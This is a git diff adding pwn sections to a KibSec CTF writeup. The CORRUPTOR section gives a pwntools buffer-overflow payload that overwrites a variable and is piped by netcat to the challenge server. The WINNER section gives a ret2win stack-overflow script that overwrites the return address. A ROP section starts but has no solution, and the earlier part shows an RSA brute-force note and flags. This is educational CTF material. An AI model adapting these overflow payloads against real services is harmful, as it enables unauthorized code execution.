@@ -1,4 +1,4 @@
-# KibSec CTF MI Writeup
+# KibSec CTF Writeup
 ## Index
 ### WEB
 1. JWT
@@ -180,3 +180,60 @@ files: source.py, encrypted_data
 RSA is breakable because bytes of data are used from the original file and then each byte is encrpyted. Hence, it is easy to brute force because we only have to try [0,255] bytes for each block. Original encrypted file was a PNG file containing the flag.
 
 Flag: **KibSec{sk0lsk1_rS4_j3_t0t4Ln1_G4s}**
+
+## CORRUPTOR
+### Materials
+hint: "remote: pwn.kibsecctf.xfer.hr 1337"<br>
+files: corruptor.zip
+
+### Solution
+Using pwngdb or gdb, get the address of _magic_ int variable. Calculate offset from _magic_ to _buf_ and then create payload that will overwrite value in magic variable.<br>
+PAYLOAD:<br>
+```
+from pwn import *
+
+payload  = b"yes\x00"
+payload += b"A" * (36 - len(payload))
+payload += p32(0xdeadbeef)
+payload += b"B" * (128 - len(payload))
+
+with open("payload.bin", "wb") as f:
+    f.write(payload)
+```
+Then, just send it with netcat:
+```
+cat payload.bin | nc pwn.kibsecctf.xfer.hr 1337
+```
+And we get the flag:<br>
+_**KibSec{girl_youll_be_a_pwner_soon}**_
+
+## WINNER
+### Materials
+hint: "can you run the win function?, remote: pwn.kibsecctf.xfer.hr 1338"<br>
+files: winner.zip
+
+### Solution
+First what we need to do is find the address of win function. Start _winner_ program with gdb or pwndbg and do ``` info functions ``` and we get that function _win()_ is at ```0x4018b5```. Next we have to find to which address program returns from the function _func()_. This is simple enough, using ```disas func``` gives information about the return address, which is ```0x401983```. All that is left to do is craft the payload and get the flag.<br>Payload:
+```
+from pwn import *
+p = remote('pwn.kibsecctf.xfer.hr', 1338)
+
+win_addr = 0x4018b5
+
+payload = b"A" * 40           # fill buffer + saved rbp
+payload += p64(win_addr)      # overwrite RIP
+
+p.sendline(b"yes")
+p.sendline(payload)
+p.interactive()
+```
+Which returns the flag:<br>
+**KibSec{mais_ma_meilleure_ennemie_cest_pwn}**
+
+## SHOUTING_MATCH
+### Materials
+hint:"rop."<br>
+files: shouting_match.zip
+
+### Solution
+
